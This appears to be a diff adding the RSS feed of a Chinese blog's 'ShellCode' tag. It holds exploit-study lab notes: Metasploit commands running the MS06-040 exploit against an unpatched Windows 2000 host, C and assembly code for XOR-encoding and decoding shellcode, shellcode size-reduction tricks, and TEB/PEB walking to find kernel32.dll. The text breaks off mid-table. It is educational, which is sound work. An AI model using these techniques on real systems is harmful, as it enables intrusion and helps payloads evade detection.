@@ -1,0 +1,752 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ShellCode on Misaka的秘密花园</title><link>https://blog.moeomu.com/zh-cn/tags/shellcode/</link><description>Recent content in ShellCode on Misaka的秘密花园</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 20 Oct 2020 22:20:00 +0800</lastBuildDate><atom:link href="https://blog.moeomu.com/zh-cn/tags/shellcode/index.xml" rel="self" type="application/rss+xml"/><item><title>漏洞利用学习笔记-005-Metasploit制作ShellCode</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-005-metasploit%E5%88%B6%E4%BD%9Cshellcode/</link><pubDate>Tue, 20 Oct 2020 22:20:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-005-metasploit%E5%88%B6%E4%BD%9Cshellcode/</guid><description>&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-005-metasploit%e5%88%b6%e4%bd%9cshellcode/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;p>&amp;hellip;未完待续(Metasploit旧版本真难找)&amp;hellip;&lt;/p>
+&lt;h2 id="入侵windows实验">入侵Windows实验&lt;/h2>
+&lt;h3 id="实验介绍">实验介绍&lt;/h3>
+&lt;blockquote>
+&lt;p>MS06-040，CVE-2006-3439&lt;/p>
+&lt;/blockquote>
+&lt;table>
+&lt;thead>
+&lt;tr>
+&lt;th>&lt;/th>
+&lt;th>推荐的环境&lt;/th>
+&lt;th>备注&lt;/th>
+&lt;/tr>
+&lt;/thead>
+&lt;tbody>
+&lt;tr>
+&lt;td>攻击机系统&lt;/td>
+&lt;td>Kali Linux 2021.1&lt;/td>
+&lt;td>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>目标主机系统&lt;/td>
+&lt;td>Windows 2000 SP4&lt;/td>
+&lt;td>&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>补丁版本&lt;/td>
+&lt;td>KB921883&lt;/td>
+&lt;td>确保目标主机未安装补丁&lt;/td>
+&lt;/tr>
+&lt;tr>
+&lt;td>网络环境&lt;/td>
+&lt;td>可互相ping通&lt;/td>
+&lt;td>确保无防火墙干扰&lt;/td>
+&lt;/tr>
+&lt;/tbody>
+&lt;/table>
+&lt;h3 id="命令行界面漏洞测试">命令行界面漏洞测试&lt;/h3>
+&lt;ul>
+&lt;li>&lt;code>use exploit/windows/smb/ms06_040_netapi&lt;/code>&lt;/li>
+&lt;li>&lt;code>set rhosts 10.211.55.5&lt;/code>&lt;/li>
+&lt;li>&lt;code>exploit&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="使用metasploit制作shellcode">使用MetaSploit制作ShellCode&lt;/h2>
+&lt;p>&amp;hellip;未完待续&amp;hellip;&lt;/p></description></item><item><title>漏洞利用学习笔记-004-ShellCode编码</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-004-shellcode%E7%BC%96%E7%A0%81/</link><pubDate>Tue, 20 Oct 2020 09:20:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-004-shellcode%E7%BC%96%E7%A0%81/</guid><description>&lt;blockquote>
+&lt;p>&lt;a class="link" href="exploit-study-04.zip" >点击此处下载本文附可执行程序，shellcode文件&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-004-shellcode%e7%bc%96%e7%a0%81/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="异或编码">异或编码&lt;/h2>
+&lt;h3 id="注意事项">注意事项&lt;/h3>
+&lt;ul>
+&lt;li>在选取编码字节时，不可与已有字节相同，否则会出现0&lt;/li>
+&lt;li>可以使用多个不同编码字节对不同区域编码，但会增加复杂度&lt;/li>
+&lt;li>可以对shellcode进行多轮编码&lt;/li>
+&lt;/ul>
+&lt;h3 id="实现代码expstd0401">实现代码(ExpStd0401)&lt;/h3>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="nf">encoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">display_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">FILE&lt;/span>&lt;span class="o">*&lt;/span> &lt;span class="n">fp&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">len&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">unsigned&lt;/span> &lt;span class="kt">char&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">malloc&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">len&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;memory error!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// encode shellcode
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">input&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">fopen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;encode.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;w+&amp;#34;&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;output file create error!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s">x%0.2x&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">16&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\&amp;#34;\n\&amp;#34;&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\&amp;#34;&lt;/span>&lt;span class="s">;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fclose&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">fp&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;dump the encoded shellcode to encode.txt OK!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">display_flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="n">len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;%0.2x &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">output&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">16&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">free&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">output&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="解码代码expstd0402">解码代码(ExpStd0402)&lt;/h3>
+&lt;ul>
+&lt;li>解码器与shellcode联合执行&lt;/li>
+&lt;li>默认EAX在shellcode开始时对准shellcode起始位置&lt;/li>
+&lt;li>shellcode最后一个字节为0x90&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">void main()
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">{
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __asm
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> {
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> add eax, 0x14 ;越过decoder记录shellcode起始地址
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor ecx, ecx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> decode_loop:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov bl, [eax + ecx]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xor bl, 0x44 ;用0x44作为key
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> mov [eax + ecx], bl
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> inc ecx
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cmp bl, 0x90 ;末尾放一个0x90作为结束符
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> jne decode_loop
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> }
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="shellcode减少体积">ShellCode减少体积&lt;/h2>
+&lt;h3 id="方法">方法&lt;/h3>
+&lt;ul>
+&lt;li>挑选短指令
+&lt;ul>
+&lt;li>&lt;code>xchg eax, reg&lt;/code> ;交换&lt;code>eax&lt;/code>和其它寄存器的值&lt;/li>
+&lt;li>&lt;code>lodsb&lt;/code> ;&lt;code>esi&lt;/code>指向的一个&lt;code>dword&lt;/code>装入&lt;code>eax&lt;/code>，并且增加&lt;code>esi&lt;/code>&lt;/li>
+&lt;li>&lt;code>lodsd&lt;/code> ;把&lt;code>esi&lt;/code>指向的一个&lt;code>byte&lt;/code>装入&lt;code>al&lt;/code>，并增加&lt;code>esi&lt;/code>&lt;/li>
+&lt;li>&lt;code>stosd&lt;/code> ;将&lt;code>eax&lt;/code>的内容复制到&lt;code>edi&lt;/code>的内存地址中，每复制四个字节，&lt;code>edi&lt;/code>就加&lt;code>0x4&lt;/code>，&lt;code>ecx&lt;/code>为大小&lt;/li>
+&lt;li>&lt;code>stosb&lt;/code> ;将&lt;code>eax&lt;/code>的内容复制到&lt;code>edi&lt;/code>的内存地址中，每复制一个字节，&lt;code>edi&lt;/code>就加&lt;code>0x4&lt;/code>，&lt;code>ecx&lt;/code>为大小&lt;/li>
+&lt;li>&lt;code>pushad/popad&lt;/code> ;从栈中存储/恢复所有寄存器的值&lt;/li>
+&lt;li>&lt;code>cdq&lt;/code> ;用&lt;code>edx&lt;/code>把&lt;code>eax&lt;/code>扩展成四字，在&lt;code>eax&amp;lt;0x80000000&lt;/code>时可用作&lt;code>mov edx, 0&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>复合指令，合并使用指令&lt;/li>
+&lt;li>API参数压栈前将栈空间一片区域置为0，压栈时只要压入非0参数即可&lt;/li>
+&lt;li>代码当数据用，数据当代码用&lt;/li>
+&lt;li>栈顶之上数据若有用，抬高栈顶保护它以便以后使用&lt;/li>
+&lt;li>调用API时有些寄存器总是被保存在栈中，但是大多数函数运行时不会使用EBP，因此可以用EBP保存数据&lt;/li>
+&lt;li>HASH算法存储API&lt;/li>
+&lt;/ul>
+&lt;h3 id="选择适当的hash算法">选择适当的HASH算法&lt;/h3>
+&lt;ul>
+&lt;li>8bit最多表示256个不同的字符，不可避免会有碰撞，但是如果所需函数位于碰撞的第一个，那么也可以使用&lt;/li>
+&lt;li>即碰撞是可以部分容忍的&lt;/li>
+&lt;/ul></description></item><item><title>漏洞利用学习笔记-003-API动态加载</title><link>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-003-api%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</link><pubDate>Mon, 19 Oct 2020 20:20:00 +0800</pubDate><guid>https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-003-api%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</guid><description>&lt;blockquote>
+&lt;p>&lt;a class="link" href="exploit-study-03.zip" >点击此处下载本文附可执行程序，shellcode文件&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>本文来源：&lt;a class="link" href="https://blog.moeomu.com/zh-cn/posts/%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0-003-api%e5%8a%a8%e6%80%81%e5%8a%a0%e8%bd%bd/" >Moeomu的博客&lt;/a>&lt;/p>
+&lt;h2 id="通过teb定位api地址">通过TEB定位API地址&lt;/h2>
+&lt;h3 id="定位kernel32dll">定位Kernel32.dll&lt;/h3>
+&lt;ul>
+&lt;li>程序加载时，用户态下&lt;code>[FS:0]&lt;/code>寄存器中存放TEB地址&lt;/li>
+&lt;li>TEB偏移0x30的位置&lt;code>[TEB + 0x30]&lt;/code>存放PEB的地址&lt;/li>
+&lt;li>PEB偏移0xC的位置&lt;code>[PEB + 0xC]&lt;/code>存放PEB_LDR_DATA&lt;/li>
+&lt;li>关于PEB_LDR_DATA结构，微软官方的说明&lt;a class="link" href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data" target="_blank" rel="noopener"
+>点此&lt;/a>，C语言表示如下&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-CPP" data-lang="CPP">&lt;span class="line">&lt;span class="cl">&lt;span class="k">typedef&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="nc">_PEB_LDR_DATA&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">BYTE&lt;/span> &lt;span class="n">Reserved1&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PVOID&lt;/span> &lt;span class="n">Reserved2&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">LIST_ENTRY&lt;/span> &lt;span class="n">InMemoryOrderModuleList&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span> &lt;span class="n">PEB_LDR_DATA&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">PPEB_LDR_DATA&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>以下是我的调试结果&lt;/p>
+&lt;/blockquote>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
